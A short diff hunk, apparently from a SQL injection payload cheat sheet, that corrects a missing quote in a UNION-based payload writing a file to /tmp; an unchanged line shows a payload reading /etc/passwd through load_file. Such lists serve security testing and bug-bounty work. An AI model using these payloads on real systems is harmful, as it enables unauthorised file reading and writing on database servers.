@@ -12,7 +12,7 @@ ___
 
 ' and 1=2 union all select load_file('/etc/passwd')--
 
-' and 1=2 union all select 'blablabla_bug_bounty_program' into outfile '/tmp/blablabla--
+' and 1=2 union all select 'blablabla_bug_bounty_program' into outfile '/tmp/blablabla'--
 
 ```
 ### Examples
